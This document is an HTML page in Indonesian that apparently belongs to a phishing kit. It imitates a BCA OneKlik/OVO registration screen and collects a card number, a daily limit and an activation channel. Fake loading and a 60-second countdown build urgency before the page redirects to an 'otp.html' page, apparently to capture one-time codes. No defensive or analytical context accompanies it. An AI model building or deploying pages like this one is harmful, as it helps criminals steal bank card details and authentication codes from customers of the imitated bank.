<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BCA OneKlik OVO</title>
    <style>
        /* CSS Styles */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f7f7f7;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 350px;
            width: 100%;
        }
        .container h1, .container h2 {
            margin: 0;
            font-size: 24px;
        }
        .container h2 {
            margin-bottom: 20px;
            color: #563d7c;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }
        .input-group label {
            font-size: 14px;
            margin-bottom: 5px;
            display: block;
        }
        .input-group input {
            width: calc(100% - 20px);
            padding: 10px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .input-group select {
            width: 100%;
            padding: 10px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .note {
            font-size: 14px;
            margin-bottom: 10px;
        }
        .submit-button {
            background-color: #00aef0;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
        }
        .submit-button:hover {
            background-color: #008cba;
        }
        .customer-service {
            color: #00aef0;
            margin-top: 20px;
            font-size: 14px;
        }
        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0, 0, 0, 0.4);
        }
        .modal-content {
            background-color: white;
            margin: 15% auto;
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
            max-width: 300px;
            text-align: center;
            border-radius: 10px;
        }
        .modal-content p {
            font-size: 14px;
            margin: 10px 0;
        }
        .modal-content button {
            background-color: #00aef0;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
        }
        .loading-gif {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>OneKlik</h1>
        <h2>OVO</h2>
        <p>Akun Pelanggan: 08388833449</p>
        
        <form id="oneklik-form" action="process.php" method="post">
            <div class="input-group">
                <label for="card-number">NOMOR KARTU</label>
                <input type="tel" id="card-number" name="card_number" placeholder="1234 5678 0111 2345">
            </div>
            
            <div class="input-group">
                <label for="limit">LIMIT HARIAN PER KARTU</label>
                <input type="tel" id="limit" name="limit" placeholder="maks. Rp 3.000.000">
            </div>
            
            <div class="input-group">
                <label for="activation">AKTIVASI MELALUI</label>
                <select id="activation" name="activation">
                    <option value="">Pilih Channel Aktivasi</option>
                    <option value="BCA MOBILE">BCA MOBILE</option>
                    <option value="INTERNET BANKING">INTERNET BANKING</option>
                </select>
            </div>
            
            <button type="submit" class="submit-button">Lanjut</button>
        </form>
        
        <p class="customer-service">Halo BCA 1500888</p>
    </div>

    <!-- The Modal -->
    <div id="myModal" class="modal">
        <div class="modal-content">
            <img src="loading.gif" alt="Loading..." class="loading-gif" id="loading-gif">
            <div class="modal-message" id="modal-message" style="display: none;">
                <p>Silakan lanjutkan proses registrasi di BCA Mobile pada menu m-Admin - Atur OneKlik</p>
                <p>Berlaku hingga <span id="validity-date">25/06 20:40:58 WIB</span></p>
                <button id="modal-ok-button">OK</button>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('card-number').addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '');
            let formattedValue = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formattedValue += ' ';
                }
                formattedValue += value[i];
            }
            e.target.value = formattedValue;
        });

        document.getElementById('oneklik-form').addEventListener('submit', function(event) {
            event.preventDefault(); // Mencegah form submit secara default

            const cardNumber = document.getElementById('card-number').value.trim();
            const limit = document.getElementById('limit').value.trim();
            const activation = document.getElementById('activation').value.trim();

            if (!cardNumber || !limit || !activation) {
                // Tambahkan getaran jika ada kolom yang belum diisi
                if (navigator.vibrate) {
                    navigator.vibrate(200);
                }
                
                return;
            }

            // Tampilkan modal dan GIF loading
            const loadingGif = document.getElementById('loading-gif');
            const modalMessage = document.getElementById('modal-message');
            loadingGif.style.display = 'block';
            modalMessage.style.display = 'none';
            showModal();

            // Sembunyikan GIF loading setelah 3 detik dan tampilkan pesan modal
            setTimeout(function() {
                loadingGif.style.display = 'none';
                modalMessage.style.display = 'block';
                startCountdown(60); // Set countdown timer to 60 seconds
            }, 3000);
        });

        function showModal() {
            document.getElementById('myModal').style.display = 'block';
        }

        function closeModal() {
            document.getElementById('myModal').style.display = 'none';
            window.location.href = 'otp.html'; // Redirect to otp.html
        }

        document.getElementById('modal-ok-button').addEventListener('click', function() {
            closeModal();
        });

        function startCountdown(seconds) {
            const validityDate = document.getElementById('validity-date');
            let timeLeft = seconds;

            const countdown = setInterval(function() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                validityDate.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds} WIB`;

                if (timeLeft <= 0) {
                    clearInterval(countdown);
                    closeModal();
                }

                timeLeft--;
            }, 1000);
        }
    </script>
</body>
</html>
